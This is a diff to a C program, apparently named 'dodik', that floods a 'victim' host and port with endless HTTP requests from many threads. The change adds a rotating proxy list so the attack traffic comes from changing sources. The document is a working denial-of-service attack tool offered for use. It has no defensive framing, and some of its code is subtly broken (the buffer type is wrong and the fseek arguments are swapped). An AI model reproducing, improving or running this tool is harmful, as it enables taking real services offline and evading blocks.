@@ -8,6 +8,7 @@
 struct data {
 	char const *host;
 	char const *port;
+	FILE *proxy;
 	int timeout;
 };
 
@@ -21,9 +22,10 @@ int main(int const argc, char const **argv)
 		printf("\nError: too few arguments\n");
 		printf("\nUsage: dodik [opt1] [value1] [opt2] [value2] ... \n\n");
 		printf("Option\tDescrhosttion\n");
-		printf("  -h  \t(MUST BE) Victim's host\n");
+		printf("  -h  \t(MUST BE) Victim's host with (optional)protocol; Example: \"https://example.org\", \"https://\" - protocol; protocol def.val.=\"http://\"\n");
 		printf("  -p  \t(MUST BE) Victim's port\n");
 		printf("  -t  \t(optional) Count threads; def.val.=1\n");
+		printf("  -pl \t(optional) List of proxy; format: protocol://address:port\n");
 		printf("  -s  \t(optional) Interval between sending packages; def.val.=0\n\n");
 		exit(EXIT_FAILURE);
 	}
@@ -34,6 +36,7 @@ int main(int const argc, char const **argv)
 	struct data args = {0};
 	args.host = NULL;
 	args.port = NULL;
+	args.proxy = NULL;
 	args.timeout = 0;
 	
 	// Argument handling
@@ -46,6 +49,12 @@ int main(int const argc, char const **argv)
 			free(thread_arr);
 			count_threads = atoi(argv[i + 1]);
 			thread_arr = (pthread_t *)malloc(sizeof(pthread_t) * count_threads);
+		}
+		else if (strcmp(argv[i], "-pl") == 0) {
+			if (args.proxy != NULL)
+				fclose(args.proxy);
+			args.proxy = fopen(argv[i + 1], "r");
+			//args.proxy = argv[i + 1];
 		}
 		else if (strcmp(argv[i], "-s") == 0)
 			args.timeout = atoi(argv[i + 1]);
@@ -81,18 +90,39 @@ size_t writefunction(char *buffer, size_t size, size_t nitem, void *n)
 
 void *threadSend(void *args)
 {
-	char const *host = ((struct data*) args)->host;
-	char const *port = ((struct data*) args)->port;
-	int timeout = ((struct data*) args)->timeout;
+	char *buffer[128] = {0};
+	
+	char const *host = ((struct data *) args)->host;
+	char const *port = ((struct data *) args)->port;
+	int timeout = ((struct data *) args)->timeout;
+	FILE *proxy = ((struct data *) args)->proxy;
+	
+	if (((struct data *) args)->proxy != NULL) {
+		if (fscanf(proxy, "%s", buffer) == EOF) {
+			fseek(proxy, SEEK_SET, 0);
+			fscanf(proxy, "%s", buffer);
+		}
+	}
 
 	CURL *curl = NULL;
 	curl = curl_easy_init();
 	curl_easy_setopt(curl, CURLOPT_URL, host);
 	curl_easy_setopt(curl, CURLOPT_PORT, atoi(port));
+	curl_easy_setopt(curl, CURLOPT_PROXY, buffer);
 	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunction);
+	curl_easy_setopt(curl, CURLOPT_TIMEOUT, timeout);
 
+	int i = 1;
 	while (1) {
 		curl_easy_perform(curl);
-		usleep(timeout * 1000000);
+		if (proxy != NULL && i == 250) {
+			if (fscanf(proxy, "%s", buffer) == EOF) {
+				fseek(proxy, SEEK_SET, 0);
+				fscanf(proxy, "%s", buffer);
+			}
+			curl_easy_setopt(curl, CURLOPT_PROXY, buffer);
+			i = 0;
+		}
+		i++;
 	}
 }
